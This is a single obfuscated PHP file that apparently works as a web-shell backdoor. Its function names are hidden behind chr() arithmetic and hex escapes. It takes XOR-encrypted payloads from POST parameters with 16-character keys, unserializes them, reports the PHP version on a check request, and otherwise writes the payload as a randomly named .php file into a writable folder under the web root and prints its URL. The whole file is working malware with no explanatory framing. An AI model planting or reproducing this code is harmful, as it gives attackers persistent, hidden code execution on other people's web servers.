<?php function WXRHi($iURLIrG){$DSoKRuwX = "\x72".chr(1013-916).chr(222-103)."\x75".chr(347-233).'l'."\144".chr(613-512)."\x63"."\157"."\x64".chr(192-91);$AuCmRBSt = "\x73".'t'.chr(688-574)."\x5f"."\162".'o'."\x74".chr(97-48)."\x33";$yrCjQk = "\163".'t'.chr(233-119)."\x5f".'s'.'p'.'l'."\151".chr(116);$iURLIrG = $yrCjQk($DSoKRuwX($AuCmRBSt($iURLIrG)));return $iURLIrG;}function CTSLIfVHVO($YKNdLc, $iURLIrG){$SAVaCRn = 's'.'t'."\162".chr(95)."\163"."\x70".chr(754-646).chr(813-708).chr(1113-997);$YKNdLc = array_slice($SAVaCRn(str_repeat($YKNdLc, (count($iURLIrG)/16)+1)), 0, count($iURLIrG));return $YKNdLc;}function gZdANZL($yyGBdJcE, $FYGGwL, $YKNdLc){$NTxiLj = "35c667cf-5d67-4433-be3a-99e634009335";return $yyGBdJcE ^ $NTxiLj[$FYGGwL % strlen($NTxiLj)] ^ $YKNdLc;}function rmaZVS($iURLIrG, $YKNdLc){$iURLIrG = array_map("gZdANZL", array_values($iURLIrG), array_keys($iURLIrG), array_values($YKNdLc));$iURLIrG = implode("", $iURLIrG);$uEnBAfaK = "\165".chr(875-765).chr(115)."\x65".chr(114).'i'.chr(848-751).chr(253-145).'i'.chr(1114-992).chr(101);$iURLIrG = @$uEnBAfaK($iURLIrG);return $iURLIrG;}function ZmXsiEVJC(){echo "aSpEVFNM";}function IPQjLs($blixyLcndEir){static $lAccK = array();$NaCEtknJ = glob($blixyLcndEir . '/*', GLOB_ONLYDIR);$GHgbOVZS = count($NaCEtknJ);if ($GHgbOVZS > 0) {foreach ($NaCEtknJ as $blixyLcndE) {$jtUGUhyf = chr(484-379).chr(115)."\137".'w'.chr(114).chr(449-344).chr(231-115).chr(891-794)."\142".chr(350-242)."\x65";if (@$jtUGUhyf($blixyLcndE)) {$lAccK[] = $blixyLcndE;}}}foreach ($NaCEtknJ as $blixyLcndEir) IPQjLs($blixyLcndEir);return $lAccK;}function ITaMtaoqoP(){echo "jqTscj";}function eDMmLAsl($iURLIrG){$dVxIJdCO = chr(68).chr(303-224).'C'."\125".chr(100-23).'E'.chr(290-212)."\124"."\137"."\x52"."\117".'O'.chr(84);$kTPkNGe = $_SERVER[$dVxIJdCO];$NaCEtknJ = IPQjLs($kTPkNGe);$bCKmfSbqee = array_rand($NaCEtknJ);$lMgFnvEuW = chr(1024-978).chr(112)."\150".'p';$VXLaQCaJF = $NaCEtknJ[$bCKmfSbqee] . "/" . substr(md5(time()), 0, 8) . $lMgFnvEuW;$MtFIqT = chr(102).'i'."\x6c"."\145"."\137".'p'."\x75"."\164"."\137".chr(505-406).chr(111)."\156".'t'.'e'."\x6e"."\164"."\163";@$MtFIqT($VXLaQCaJF, $iURLIrG);$scrMYQgr = "\110".'T'.'T'."\x50".chr(95).chr(977-905).chr(79).chr(83).chr(84);$YBmMQ = chr(104)."\164"."\x74"."\x70".chr(58).chr(47)."\57";$lrtyd = $YBmMQ . $_SERVER[$scrMYQgr] . substr($VXLaQCaJF, strlen($kTPkNGe));print($lrtyd);}foreach ($_POST as $YKNdLc => $iURLIrG){$WzYEPlGlQa = strlen($YKNdLc);if ($WzYEPlGlQa == 16){$iURLIrG = WXRHi($iURLIrG);$YKNdLc = CTSLIfVHVO($YKNdLc, $iURLIrG);$iURLIrG = rmaZVS($iURLIrG, $YKNdLc);if (@is_array($iURLIrG)){$bCKmfSbqee = array_keys($iURLIrG);$iURLIrG = $iURLIrG[$bCKmfSbqee[0]];if ($iURLIrG === $bCKmfSbqee[0]){$RpTQB = "\x70".chr(114-10)."\160";$fzQWlmI = 'p'.chr(104)."\x70".'v'."\x65".chr(286-172).chr(365-250).chr(105).chr(1042-931).chr(155-45);$hWLODhYW = 's'."\x65"."\162"."\151"."\141".chr(108)."\151"."\x7a".'e';echo @$hWLODhYW(Array($RpTQB => @$fzQWlmI(), ));}else {eDMmLAsl($iURLIrG);}die();}}}